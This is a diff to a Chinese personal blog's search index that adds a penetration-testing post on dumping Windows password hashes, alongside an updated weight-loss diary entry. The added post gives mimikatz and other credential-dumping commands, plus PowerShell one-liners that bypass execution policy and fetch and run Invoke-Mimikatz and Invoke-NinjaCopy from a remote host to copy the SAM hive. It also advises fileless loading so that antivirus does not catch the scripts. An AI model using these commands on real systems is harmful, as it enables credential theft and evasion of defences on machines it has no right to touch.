@@ -1,9 +1,20 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Windows下抓取hash的几种方式]]></title>
+    <url>%2F2019%2F08%2F15%2FWindows%E4%B8%8B%E6%8A%93%E5%8F%96hash%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%2F</url>
+    <content type="text"><![CDATA[在渗透测试过程中，对于windows系统的机器渗透需要注意hash的获取，其中hash分为LM-HASH与NTLM-HASH，在windows系统中，hash的默认存储位置为： C:\Windows\System32\config\SAM 各种工具： mimikatzprivilege::debugsekurlsa::logonPasswords wcewce.exe QuarkPwDumpQuarkPwDump.exe -dhl powershell脚本：使用powersploit中的mimikatz.ps1mimikatz在线加载：powershell -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://ip/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -Dumpcreds&quot;本地加载：powershell -exec bypass &quot;import-module Invoke-Mimikatz.ps1;Invoke-Mimikatz -Dumpcreds&quot; Ninja-copy在线加载：powershell -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://ip/Invoke-NinjaCopy.ps1&#39;);Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination C:\SAM.txt;&quot;本地加载：powershell -exec bypass &quot;Import-Module .\Invoke-NinjaCopy.ps1;Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive&quot; 后记：为防止防火墙，杀软等工具杀掉ps1脚本，推荐使用在线加载的方式，文件不落地。]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>hash</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[减肥史]]></title>
     <url>%2F2019%2F08%2F12%2F%E5%87%8F%E8%82%A5%E5%8F%B2%2F</url>
-    <content type="text"><![CDATA[开始努力减肥~控制饮食，少吃油炸烧烤，尽量多运动 2019.08.12 星期一 早晨测量体重：87.6KG]]></content>
+    <content type="text"><![CDATA[开始努力减肥~控制饮食，少吃油炸烧烤，尽量多运动 2019.08.12 星期一 早晨测量体重：87.6KG2019.08.13 星期二 早晨测量体重：87.4KG2019.08.14 星期三 早晨测量体重：87.7KG 。。。今天又吃的比较多。。估计明天体重会更重。。明天一定要更加油努力减肥了！！！2019.08.15 星期四 早晨测量体重：87.5KG]]></content>
       <categories>
         <category>私人生活</category>
       </categories>
